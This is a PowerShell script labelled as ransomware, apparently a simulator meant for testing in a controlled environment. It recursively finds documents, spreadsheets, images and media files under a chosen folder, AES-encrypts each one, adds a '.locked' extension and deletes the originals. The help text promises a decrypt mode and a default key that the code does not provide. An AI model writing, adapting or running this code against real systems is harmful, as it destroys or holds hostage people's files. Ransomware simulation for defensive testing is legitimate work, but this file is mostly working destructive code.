 <#

.SYNOPSIS
    Ransomware Script using AES to recursively encrypt files at a given folder path.
    Author: Mihir Katre || mkatre@albany.edu
    Date Created: 02/21/2024

.DESCRIPTION
    This script is intended to be used to attack a system in a controlled environment and encrypt all files with an encryption key.

.EXAMPLE
    .\RanSim.ps1 -mode encrypt -targetpath "C:\Mihir"

.PARAMETER File Extension
    This optional parameter defines the extension that will be added to the encrypted files once attacked. A default extension is provided.

.PARAMETER Encryption key
    This optional parameter is the plain-text AES encryption key used for both encryption and decryption. A default key is provided. 

.Types of files checked
    "*.pdf','*.xls*','*.ppt*','*.doc*','*.accd*','*.rtf','*.txt','*.csv','*.jpg','*.jpeg','*.png','*.gif','*.avi','*.midi','*.mov','*.mp3','*.mp4','*.mpeg','*.mpeg2','*.mpeg3','*.mpg','*.ogg"

.NOTES
    This script uses the FileCryptopgraphy module from Tyler Siegrist - https://gallery.technet.microsoft.com/scriptcenter/EncryptDecrypt-files-use-65e7ae5d

#>

# Define parameters and their defaults
param([string]$Mode,
      [string]$TargetPath = "C:\EnterYourPath",
      [string]$Extension = ".locked",
      [string]$Key = ""
)

# Define target file types
$TargetFiles = '*.pdf','*.xls*','*.ppt*','*.doc*','*.accd*','*.rtf','*.txt','*.csv','*.jpg','*.jpeg','*.png','*.gif','*.avi','*.midi','*.mov','*.mp3','*.mp4','*.mpeg','*.mpeg2','*.mpeg3','*.mpg','*.ogg'

# Import FileCryptography module
Import-Module "$PSScriptRoot\FileCryptography.psm1"

if ($mode -eq "encrypt") {
    # Gather all files from the target path and its subdirectories
    $FilesToEncrypt = get-childitem -path $TargetPath\* -Include $TargetFiles -Exclude *$Extension -Recurse -force | where { ! $_.PSIsContainer }
    $NumFiles = $FilesToEncrypt.length

    # Encrypt the files
    foreach ($file in $FilesToEncrypt)
    {
        Write-Host "Encrypting $file"
        Protect-File $file -Algorithm AES -KeyAsPlainText $key -Suffix $Extension -RemoveSource
    }
    Write-Host "Encrypted $NumFiles files." | Start-Sleep -Seconds 10
}

#Error Handling
else {
    write-host "ERROR: must choose a mode (encrypt or decrypt). Example usage: .\EncryptFiles.ps1 -mode encrypt"
}
exit 
